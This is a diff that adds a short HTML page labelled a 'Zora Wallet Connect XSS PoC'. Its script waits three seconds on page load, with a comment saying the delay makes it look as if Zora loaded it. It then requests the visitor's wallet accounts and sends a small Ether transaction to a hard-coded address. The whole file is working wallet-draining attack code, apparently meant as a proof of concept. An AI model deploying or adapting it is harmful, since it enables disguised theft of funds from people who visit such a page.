@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Zora Wallet Connect XSS PoC</title>
+  <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
+</head>
+<body>
+  <h1>PoC: Wallet Auto-Connect</h1>
+  <p>Wait a moment... the wallet should connect and attempt a tiny transaction.</p>
+  <script>
+    async function connectWallet() {
+      if (window.ethereum) {
+        const web3 = new Web3(window.ethereum);
+        await window.ethereum.request({ method: 'eth_requestAccounts' });
+        const accounts = await web3.eth.getAccounts();
+        const from = accounts[0];
+        const to = "0xCF62064d70593ecd8B319b267F769ddD181157d2";  // Your test address
+        const amount = web3.utils.toWei("0.000000001", "ether");
+        web3.eth.sendTransaction({ from, to, value: amount });
+      }
+    }
+    setTimeout(connectWallet, 3000);  // Delay so it looks like Zora loaded it
+  </script>
+</body>
+</html>
